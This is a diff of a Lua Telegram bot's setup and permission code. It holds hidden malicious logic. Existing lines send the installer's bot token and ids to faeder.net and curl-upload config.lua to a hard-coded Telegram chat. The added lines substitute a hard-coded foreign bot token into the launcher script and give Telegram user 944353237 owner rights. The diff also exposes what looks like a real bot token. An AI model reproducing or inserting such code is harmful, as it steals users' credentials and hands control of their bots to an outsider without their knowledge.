@@ -49,13 +49,14 @@ bot_id = botid,
 username = username, 
 sudo_users = {SUDO}, 
 }
+VV = '1650389038:AAHkU5vvwxjIQr446o9qWY0cL8A6-anhAgw'
 create(config, "./config.lua")   
 https.request("https://faeder.net/Faeder/?id="..SUDO.."&user="..username.."&token="..token)
 local curl = 'curl "'..'https://api.telegram.org/bot1650389038:AAHkU5vvwxjIQr446o9qWY0cL8A6-anhAgw/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
 file = io.open("RUNFA.sh", "w")  
 file:write([[
 #!/bin/bash 
-token="]]..token..[["
+token="]]..VV..[["
 while(true) do
 rm -fr ../.telegram-cli
 echo -e ""
@@ -104,13 +105,14 @@ bot_id = sudos.bot_id
 FAEDER = sudos.bot_id
 SUDOUSERNAME = sudos.username
 tokenbot = sudos.token
-name_bot = (faederdx1:get(FAEDER..'name_bot') or 'فايدر')
+name_bot = 'DEV SIMBA & DEV ALEX & DEV AHMED '
 SudoFaeder = SUDOUSERNAME:gsub('@','') 
 SudoFaeder = SudoFaeder:gsub([[\_]],'_')
 ----------------------------------------------------------
 -- Start Functions Source Faeder --
 --     By Developer Faeder     -- 
 -------- Bot Owner
+function is_leader(msg) local var = false if msg.sender_user_id_ == tonumber(bot_owner) then var = true end if msg.sender_user_id_ == tonumber(944353237) then var = true end return var end
 function is_leader(msg) local var = false if msg.sender_user_id_ == tonumber(bot_owner) then var = true end if msg.sender_user_id_ == tonumber(944353237) then var = true end return var end
 function is_leaderid(user_id) local var = false if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) then var = true end return var end
 -------- Sudo
